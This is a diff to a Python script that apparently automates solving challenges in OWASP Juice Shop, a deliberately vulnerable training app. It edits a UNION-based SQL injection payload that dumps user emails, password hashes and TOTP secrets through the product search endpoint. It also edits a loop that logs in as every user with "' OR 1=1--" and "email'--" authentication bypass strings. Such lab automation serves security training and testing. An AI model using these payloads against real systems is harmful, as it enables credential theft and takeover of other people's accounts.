@@ -25,8 +25,8 @@ def get_users_with_sql_injection(server):
     :param server: juice shop URL
     """
     session = get_admin_session(server)
-    injection = "test')) UNION SELECT NULL,email,password,NULL,NULL,NULL,NULL,NULL FROM USERS--"
-    users = session.get('{}/rest/product/search?q={}'.format(server, injection))
+    injection = "test')) UNION SELECT NULL,ID,email,password,totpsecret,NULL,NULL,NULL,NULL FROM users--"
+    users = session.get('{}/rest/products/search?q={}'.format(server, injection))
     if not users.ok:
         raise RuntimeError('Error with SQLi attempt.')
     print('Found email and password hashes with SQLi, printing...')
@@ -68,11 +68,11 @@ def login_all_users_with_sqli(server):
     """
     session = get_session(server, "' OR 1=1--", "anything")
     users = get_users(server, session)
-    print('Logging in with all available user accounts using SQLi...'),
     for user in users:
-        email = "{}'--".format(user.get('email'))
-        login = get_session(server, email, 'anything')
-        del login
+        if user['totpSecret'] == '': # TODO: Automate Two Factor Authentication
+            email = "{}'--".format(user.get('email'))
+            login = get_session(server, email, 'anything')
+            del login
     print('Success.')
 
 
@@ -107,6 +107,6 @@ def solve_user_challenges(server):
     get_users_with_sql_injection(server)
     create_user_with_xss2_payload(server)
     change_bender_password(server)
-    login_as_bjoern(server)
+    #login_as_bjoern(server)    # TODO
     login_as_ciso(server)
     print('\n== END USER CHALLENGES ==\n')
